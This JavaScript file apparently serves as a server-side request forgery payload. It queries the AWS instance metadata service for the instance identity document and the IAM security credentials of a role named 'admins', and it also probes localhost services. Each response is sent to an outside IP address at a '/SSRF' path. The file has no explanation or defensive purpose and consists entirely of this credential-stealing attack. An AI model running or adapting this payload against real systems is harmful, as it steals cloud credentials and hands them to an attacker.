var url0 = "http://169.254.169.254/latest/dynamic/instance-identity/document";
var url1 = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admins";
var url2 = "http://localhost:3000";
var url3 = "http://localhost:3000/1/catalogs";

var out = document.getElementById("output");
out.innerHTML = "init";
function handler() {
  console.log(1);
  if(this.status == 200 && this.responseText != null) {
    // success!
    if (this.responseText.search("Not Found")){
      //do whatever you want
      var xhr2 = new XMLHttpRequest();
      xhr2.onreadystatechange = none; 
      xhr2.open("GET", 'http://192.241.169.35/SSRF?u='+encodeURIComponent(this.responseText), true);
      xhr2.send();
}
  } else {
    // something went wrong
    //console.log("hmmm...")
  }
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = handler;
try{
 xhr.open("GET", url0, true);
 xhr.send();
 } catch(err) {}

try{
xhr.open("GET", url1, true);
xhr.send();
 } catch(err) {}

try{
xhr.open("GET", url2, true);
xhr.send();
 } catch(err) {}

try{
xhr.open("GET", url3, true);
xhr.send();
 } catch(err) {}